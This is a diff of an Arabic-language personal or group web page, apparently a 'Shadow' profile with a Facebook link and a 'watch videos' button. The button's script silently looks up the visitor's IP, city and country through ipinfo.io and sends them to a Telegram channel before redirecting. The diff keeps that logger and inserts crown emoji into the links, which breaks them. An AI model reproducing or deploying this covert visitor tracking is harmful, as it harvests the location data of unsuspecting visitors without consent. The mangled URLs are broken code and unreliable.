@@ -127,13 +127,13 @@
 <body>
 
   <div class="top-description">
-    ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير |
-    طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم |
+    ركوب جلجامشة | تجاوزت جلجامشة خطوط الحمراء وبذلك صار دعسها عنوانها الاول ولأخير | 
+    طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم | 
     لطالما كان ظلام كلمات لا يفهمها الا من قرأها وشادو من سا يكتب الكلمات
   </div>
 
   <header>
-    <a href="https://www.facebook.com/profile.php?id=61573033204340" target="_blank">
+    <a href="👑 https://www.facebook.com/profile.php?id=61573033204340" target="_blank">
       <div class="profile-pic"></div>
     </a>
   </header>
@@ -155,7 +155,7 @@
   <div id="img1" class="lightbox"><a href="#" class="close-btn">×</a><img src="بدون اسم130_20250502141304.png"></div>
   <div id="img2" class="lightbox"><a href="#" class="close-btn">×</a><img src="بدون اسم150_20250616203704.png"></div>
 
-  <!-- 👑 زر فيديو -->
+  <!-- 👑 زر فيديو برابط قابل للتغيير -->
   <button class="video-button" onclick="sendVideoClick()">🎥 مشاهدة الفيديوهات</button>
 
   <script>
@@ -220,13 +220,11 @@
       fetch("https://ipinfo.io/json")
         .then(res => res.json())
         .then(data => {
-          const msg = `🎬 دخول زر الفيديو:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}\n🔗 /videos.html`;
+          const msg = `🎬 دخول زر الفيديو:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}\n🔗 👑 /videos.html`;
           sendToTelegram(msg);
-          window.location.href = "index-videos.html";
+          window.location.href = "👑 videos.html"; // 👑 ضع هنا رابط الفيديو
         });
     }
   </script>
-
 </body>
 </html>
-
